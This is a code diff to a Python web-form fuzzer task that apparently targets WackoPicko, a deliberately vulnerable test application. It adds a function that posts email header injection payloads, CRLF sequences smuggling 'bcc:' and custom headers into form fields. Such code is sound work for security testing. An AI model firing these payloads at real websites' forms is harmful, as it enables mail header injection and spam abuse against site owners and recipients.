@@ -66,9 +66,8 @@ def construct_url(action, main_url):
     return url
 
 @app.task(name='Fuzzer.fuzzer')
-def fuzzer(reconstructed_form, form_id, payload):
-    # TODO: make this entire thing into a function
-    # which takes in a payload and fuzzes that into
+def fuzzer(reconstructed_form, form_id, payload, fields_to_fuzz):
+    # a function which takes in a payload and fuzzes that into
     # every field. Changes after talking to Adam as
     # of Feb 19, 2016.
     try:
@@ -113,6 +112,16 @@ def fuzzer(reconstructed_form, form_id, payload):
             "submit": "submit"
         }
 
+
+        # instead of fuzzing the email field alone,
+        # check whether the other fields need to be fuzzed
+        if (fields_to_fuzz != None and len(fields_to_fuzz) >= 1):
+            # need to fuzz the specified fields as well,
+            # so update the dictionary with the values
+            for field in fields_to_fuzz:
+                form_data_dict[field] = payload
+
+        print(form_data_dict)
         data = {}
 
         for a_input in input_list:
@@ -157,6 +166,7 @@ def fuzzer(reconstructed_form, form_id, payload):
         # print("HERES THE DATA", data_2)
         # print("HERES THE DATA", data_3)
 
+
         method = str(method).lower()
         headers = {'content-type': 'application/x-www-form-urlencoded',
                    'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:45.0) Gecko/20100101 Firefox/45.0'}
@@ -190,7 +200,7 @@ def fuzzer(reconstructed_form, form_id, payload):
         # print(r.text)
         # this is only for testing that the data is right,
         # we do not do anything with the data
-        print("HERES THE DATA afterwards", data)
+        print("HERES THE DATA afterwards", data, form_data_dict['name'])
         return data
 
     except Exception as e:
@@ -206,11 +216,19 @@ def call_fuzzer_with_payload(reconstructed_form, form_id):
     # nuser123%0abcc%3amaluser123@wackopicko.com
     # nuser123@wackopicko.com%0abcc%3amaluser123@wackopicko.com
     # nuser123@wackopicko.com%0abcc:maluser123@wackopicko.com
-    payload_2 = 'nuser123@wackopicko.com\r\nbcc:maluser123@wackopicko.com\r\nx-check:in'
-    payload_3 = 'reguser123@wackopicko.com'
-    payload_4 = 'nuser123@wackopicko.com\nbcc:maluser123@wackopicko.com'
-    payload_5 = 'nuser123@wackopicko.com\r\nbcc:maluser123@wackopicko.com'
+    # user_id = random.randint(0, 100000)
+    payload = 'reguser' + str(form_id) + '@wackopicko.com'
+    fields_to_fuzz = []
+    fuzzer(reconstructed_form, form_id, payload, fields_to_fuzz)
+    pass
 
-    payload = 'nuser123@wackopicko.com\nbcc:maluser123@wackopicko.com\nx-check:in'
-    fuzzer(reconstructed_form, form_id, payload)
+def call_fuzzer_with_malicious_payload(reconstructed_form, form_id, fields_to_fuzz):
+    payloads = [
+                'nuser' + form_id + '@wackopicko.com\r\nbcc:maluser' + form_id + '@wackopicko.com\r\nx-check:in',
+                'nuser' + form_id + '@wackopicko.com\nbcc:maluser' + form_id + '@wackopicko.com\nx-check:in',
+                'nuser' + form_id + '@wackopicko.com\nbcc:maluser' + form_id + '@wackopicko.com',
+                'nuser' + form_id + '@wackopicko.com\r\nbcc:maluser' + form_id + '@wackopicko.com'
+                ]
+    for payload in payloads:
+        fuzzer(reconstructed_form, form_id, payload, fields_to_fuzz)
     pass
